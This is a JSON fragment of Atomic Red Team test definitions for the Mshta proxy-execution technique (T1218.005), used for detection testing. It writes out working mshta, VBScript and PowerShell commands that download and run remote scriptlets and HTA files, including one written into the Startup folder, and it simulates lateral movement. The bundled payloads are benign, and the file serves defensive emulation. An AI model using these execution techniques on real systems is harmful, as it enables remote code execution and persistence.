                "attack_technique": "T1218.005",
                "display_name": "Signed Binary Proxy Execution: Mshta",
                "atomic_tests": [
                    {
                        "name": "Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject",
                        "auto_generated_guid": "1483fab9-4f52-4217-a9ce-daa9d7747cae",
                        "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "file_url": {
                                "description": "location of the payload",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct"
                            }
                        },
                        "executor": {
                            "command": "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Mshta executes VBScript to execute malicious command",
                        "auto_generated_guid": "906865c3-e05f-4acc-85c4-fbc185455095",
                        "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Mshta Executes Remote HTML Application (HTA)",
                        "auto_generated_guid": "c4b97eeb-5249-4455-a607-59f95485cb45",
                        "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "temp_file": {
                                "description": "temp_file location for hta",
                                "type": "string",
                                "default": "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta"
                            },
                            "hta_url": {
                                "description": "URL to HTA file for execution",
                                "type": "string",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
                            }
                        },
                        "executor": {
                            "command": "$var =Invoke-WebRequest \"#{hta_url}\"\n$var.content|out-file \"#{temp_file}\"\nmshta \"#{temp_file}\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force\n",
                            "cleanup_command": "remove-item \"#{temp_file}\" -ErrorAction Ignore\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement",
                        "auto_generated_guid": "007e5672-2088-4853-a562-7490ddc19447",
                        "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "script_engine": {
                                "description": "Script Engine to use",
                                "type": "string",
                                "default": "JScript"
                            },
                            "hta_file_path": {
                                "description": "HTA file name and or path to be used",
                                "type": "string",
                                "default": "Test.hta"
                            },
                            "mshta_file_path": {
                                "description": "Location of mshta.exe",
                                "type": "string",
                                "default": "$env:windir\\system32\\mshta.exe"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Invoke HTML Application - Jscript Engine Simulating Double Click",
                        "auto_generated_guid": "58a193ec-131b-404e-b1ca-b35cf0b18c33",
                        "description": "Executes an HTA Application using JScript script engine simulating double click.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "script_engine": {
                                "description": "Script Engine to use",
                                "type": "string",
                                "default": "JScript"
                            },
                            "hta_file_path": {
                                "description": "HTA file name and or path to be used",
                                "type": "string",
                                "default": "Test.hta"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Invoke HTML Application - Direct download from URI",
                        "auto_generated_guid": "39ceed55-f653-48ac-bd19-aceceaf525db",
                        "description": "Executes an HTA Application by directly downloading from remote URI.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "mshta_file_path": {
                                "description": "Location of mshta.exe",
                                "type": "string",
                                "default": "$env:windir\\system32\\mshta.exe"
                            },
                            "hta_uri": {
                                "description": "URI to HTA",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler",
                        "auto_generated_guid": "e7e3a525-7612-4d68-a5d3-c4649181b8af",
                        "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "rundll32_file_path": {
                                "description": "Location of rundll32.exe",
                                "type": "path",
                                "default": "$env:windir\\system32\\rundll32.exe"
                            },
                            "script_engine": {
                                "description": "Script Engine to use",
                                "type": "string",
                                "default": "JScript"
                            },
                            "protocol_handler": {
                                "description": "Protocol Handler to use",
                                "type": "string",
                                "default": "About"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler",
                        "auto_generated_guid": "d3eaaf6a-cdb1-44a9-9ede-b6c337d0d840",
                        "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "mshta_file_path": {
                                "description": "Location of mshta.exe",
                                "type": "path",
                                "default": "$env:windir\\system32\\mshta.exe"
                            },
                            "script_engine": {
                                "description": "Script Engine to use",
                                "type": "string",
                                "default": "JScript"
                            },
                            "protocol_handler": {
                                "description": "Protocol Handler to use",
                                "type": "string",
                                "default": "About"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path",
                        "auto_generated_guid": "b8a8bdb2-7eae-490d-8251-d5e0295b2362",
                        "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "mshta_file_path": {
                                "description": "Location of mshta.exe",
                                "type": "string",
                                "default": "$env:windir\\system32\\mshta.exe"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.",
                                "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}",
                                "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Mshta used to Execute PowerShell",
                        "auto_generated_guid": "8707a805-2b76-4f32-b1c0-14e558205772",
                        "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "message": {
                                "description": "Encoded message to include",
                                "type": "string",
                                "default": "Hello,%20MSHTA!"
                            },
                            "seconds_to_sleep": {
                                "description": "How many seconds to sleep/wait",
                                "type": "integer",
                                "default": 5
                            }
                        },
                        "executor": {
                            "command": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}\"\"\"))</script>'\"\n",
                            "name": "command_prompt"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 14:15:12"
}